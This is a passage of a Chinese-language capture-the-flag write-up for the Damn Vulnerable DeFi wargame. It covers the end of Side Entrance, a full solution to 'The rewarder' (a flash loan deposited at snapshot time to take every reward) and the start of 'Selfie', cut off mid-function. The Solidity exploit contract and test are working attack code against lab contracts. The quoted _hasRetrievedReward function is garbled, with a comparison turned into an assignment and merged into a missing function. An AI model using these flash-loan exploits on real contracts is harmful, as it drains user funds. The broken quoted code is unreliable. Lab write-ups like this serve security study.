            pool.deposit{value:msg.value}();
        }
        receive() external payable{}
    }
    const AttackSideEntrance = contract.fromArtifact('AttackSideEntrance');
    // ...
    it('Exploit', async function () {
        const attack = await AttackSideEntrance.new();
        await attack.attack(this.pool.address, { from: attacker });
    });
## The rewarder
> There’s a pool offering rewards in tokens every 5 days for those who deposit
> their DVT tokens into it.
>
> Alice, Bob, Charlie and David have already deposited some DVT tokens, and
> have won their rewards!
>
> You don’t have any DVT tokens. Luckily, these are really popular nowadays,
> so there’s another pool offering them in free flash loans.
>
> In the upcoming round, you must claim all rewards for yourself.
本题要求我们获得全部奖励的 token 并且让其他人不能获得收益。阅读合约代码，发现该合约会每隔五天根据用户 token
的余额快照来发放奖励，奖励的额度跟池中全部的 token 数目和用户存入的 token 数目有关：
    contract TheRewarderPool {
        // Minimum duration of each round of rewards in seconds
        uint256 private constant REWARDS_ROUND_MIN_DURATION = 5 days;
        uint256 public lastSnapshotIdForRewards;
        uint256 public lastRecordedSnapshotTimestamp;
        mapping(address => uint256) public lastRewardTimestamps;
        // Token deposited into the pool by users
        DamnValuableToken public liquidityToken;
        // Token used for internal accounting and snapshots
        // Pegged 1:1 with the liquidity token
        AccountingToken public accToken;
        // Token in which rewards are issued
        RewardToken public rewardToken;
        // Track number of rounds
        uint256 public roundNumber;
        constructor(address tokenAddress) public {
            // Assuming all three tokens have 18 decimals
            liquidityToken = DamnValuableToken(tokenAddress);
            accToken = new AccountingToken();
            rewardToken = new RewardToken();
            _recordSnapshot();
        }
        /**
         * @notice sender must have approved `amountToDeposit` liquidity tokens in advance
         */
        function deposit(uint256 amountToDeposit) external {
            require(amountToDeposit > 0, "Must deposit tokens");
            accToken.mint(msg.sender, amountToDeposit);
            distributeRewards();
            require(
                liquidityToken.transferFrom(msg.sender, address(this), amountToDeposit)
            );
        }
        function withdraw(uint256 amountToWithdraw) external {
            accToken.burn(msg.sender, amountToWithdraw);
            require(liquidityToken.transfer(msg.sender, amountToWithdraw));
        }
        function distributeRewards() public returns (uint256) {
            uint256 rewardInWei = 0;
            if(isNewRewardsRound()) {
                _recordSnapshot();
            }        
            uint256 totalDeposits = accToken.totalSupplyAt(lastSnapshotIdForRewards);
            uint256 amountDeposited = accToken.balanceOfAt(msg.sender, lastSnapshotIdForRewards);
            if (totalDeposits > 0) {
                uint256 reward = (amountDeposited * 100) / totalDeposits;
                if(reward > 0 && !_hasRetrievedReward(msg.sender)) {                
                    rewardInWei = reward * 10 ** 18;
                    rewardToken.mint(msg.sender, rewardInWei);
                    lastRewardTimestamps[msg.sender] = block.timestamp;
                }
            }
            return rewardInWei;     
        }
        function _recordSnapshot() private {
            lastSnapshotIdForRewards = accToken.snapshot();
            lastRecordedSnapshotTimestamp = block.timestamp;
            roundNumber++;
        }
        function _hasRetrievedReward(address account) private view returns (bool) {
            return (
                lastRewardTimestamps[account] >= lastRecordedSnapshotTimestamp &&
                lastRewardTimestamps[account] = lastRecordedSnapshotTimestamp + REWARDS_ROUND_MIN_DURATION;
        }
    }
但这种奖励在设计上是存在一定问题的，因为它依赖的是某个时间节点的信息，而非连续性的节点，这意味着如果我们能在某个时间节点进行操作，完全可以影响奖励的发放。考虑到
`FlashLoanerPool` 提供的贷款功能，如果我们在某个时间节点借走了池中全部的 token 并通过 `deposit()` 函数放入
`TheRewarderPool`，主动触发 `distributeRewards()` 获得奖励，由于池中拥有的 1000000 ether
远远大于其他人存入的 100 ether，所以根据计算公式 `reward = (amountDeposited * 100) /
totalDeposits`，最后其他人的收益会变成 0。
根据思路，编写部署合约并测试：
    pragma solidity ^0.6.0;
    import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
    import "@openzeppelin/contracts/access/AccessControl.sol";
    import "../DamnValuableToken.sol";
    interface IFlashLoanerPool {
        function flashLoan(uint256 amount) external;
    }
    interface ITheRewarderPool {
        function deposit(uint256 amountToDeposit) external;
        function withdraw(uint256 amountToWithdraw) external;
        function distributeRewards() external returns (uint256);
        function isNewRewardsRound() external view returns (bool);
    }
    /**
     * @notice A mintable ERC20 token to issue rewards
     */
    contract RewardToken is ERC20, AccessControl {
        bytes32 public constant MINTER_ROLE = keccak256("MINTER_ROLE");
        constructor() public ERC20("Reward Token", "RWT") {
            _setupRole(DEFAULT_ADMIN_ROLE, msg.sender);
            _setupRole(MINTER_ROLE, msg.sender);
        }
        function mint(address to, uint256 amount) external {
            require(hasRole(MINTER_ROLE, msg.sender));
            _mint(to, amount);
        }
    }
    contract AttackReward {
        DamnValuableToken public liquidityToken;
        RewardToken public rewardToken;
        IFlashLoanerPool public flashLoanerPool;
        ITheRewarderPool public theRewarderPool;
        constructor(address liquidityTokenAddress, address rewardTokenAddress, IFlashLoanerPool _flashLoanerPool, ITheRewarderPool _theRewarderPool) public {
            liquidityToken = DamnValuableToken(liquidityTokenAddress);
            rewardToken = RewardToken(rewardTokenAddress);
            flashLoanerPool = _flashLoanerPool;
            theRewarderPool = _theRewarderPool;
        }
        function attack(uint256 amount) public {
            flashLoanerPool.flashLoan(amount);
            rewardToken.transfer(msg.sender, rewardToken.balanceOf(address(this)));
        }
        function receiveFlashLoan(uint256 amount) public {
            liquidityToken.approve(address(theRewarderPool), amount);
            theRewarderPool.deposit(amount);
            theRewarderPool.withdraw(amount);
            liquidityToken.transfer(address(flashLoanerPool), amount);
        }
    }
    it('Exploit', async function () {
        await time.increase(time.duration.days(5));
        const attack = await AttackReward.new(this.liquidityToken.address, this.rewardToken.address, this.flashLoanPool.address, this.rewarderPool.address, { from: attacker});
        await attack.attack(TOKENS_IN_LENDER_POOL, { from: attacker });
    });
## Selfie
> A new cool lending pool has launched! It’s now offering flash loans of DVT
> tokens.
>
> Wow, and it even includes a really fancy governance mechanism to control it.
>
> What could go wrong, right ?
>
> You start with no DVT tokens in balance, and the pool has 1.5 million. Your
> objective: steal them all.
同样的清空贷款池挑战，直接阅读源代码：
    contract SelfiePool is ReentrancyGuard {
        using Address for address payable;
        ERC20Snapshot public token;
        SimpleGovernance public governance;
        event FundsDrained(address indexed receiver, uint256 amount);
        modifier onlyGovernance() {
            require(msg.sender == address(governance), "Only governance can execute this action");
            _;
        }
        constructor(address tokenAddress, address governanceAddress) public {
            token = ERC20Snapshot(tokenAddress);
            governance = SimpleGovernance(governanceAddress);
        }
        function flashLoan(uint256 borrowAmount) external nonReentrant {
            uint256 balanceBefore = token.balanceOf(address(this));
            require(balanceBefore >= borrowAmount, "Not enough tokens in pool");
            token.transfer(msg.sender, borrowAmount);        
            require(msg.sender.isContract(), "Sender must be a deployed contract");
            (bool success,) = msg.sender.call(
                abi.encodeWithSignature(
                    "receiveTokens(address,uint256)",
                    address(token),
                    borrowAmount
                )
            );
            require(success, "External call failed");
            uint256 balanceAfter = token.balanceOf(address(this));
            require(balanceAfter >= balanceBefore, "Flash loan hasn't been paid back");
        }
        function drainAllFunds(address receiver) external onlyGovernance {
            uint256 amount = token.balanceOf(address(this));
            token.transfer(receiver, amount);
            emit FundsDrained(receiver, amount);
        }
    }
可以看到有一个函数很有意思，`drainAllFunds()` 会将全部的余额转给 receiver，但修饰符 `onlyGovernance`
限定了调用者，继续阅读相应的 `SimpleGovernance` 合约，可以发现 `SimpleGovernance` 合约的
`executeAction()` 预留了 call 函数来进行任意调用：
    contract SimpleGovernance {
        // 省略
        function executeAction(uint256 actionId) external payable {
            require(_canBeExecuted(actionId), "Cannot execute this action");
            GovernanceAction storage actionToExecute = actions[actionId];
            actionToExecute.executedAt = block.timestamp;
            (bool success,) = actionToExecute.receiver.call{
                value: actionToExecute.weiAmount
            }(actionToExecute.data);
            require(success, "Action failed");
            emit ActionExecuted(actionId, msg.sender);
        }
        function getActionDelay() public view returns (uint256) {
            return ACTION_DELAY_IN_SECONDS;
        }
        /**
         * @dev an action can only be executed if:
         * 1) it's never been executed before and
         * 2) enough time has passed since it was first proposed
         */
        function _canBeExecuted(uint256 actionId) private view returns (bool) {
            GovernanceAction memory actionToExecute = actions[actionId];
            return (
                actionToExecute.executedAt == 0 &&
                (block.timestamp - actionToExecute.proposedAt >= ACTION_DELAY_IN_SECONDS)
            );
        }
    }
这提醒了我们，如果能利用这里的 call，调用 `drainAllFunds()` 函数，即可顺利解决本题。继续阅读调用的条件：
    function queueAction(address receiver, bytes calldata data, uint256 weiAmount) external returns (uint256) {
        require(_hasEnoughVotes(msg.sender), "Not enough votes to propose an action");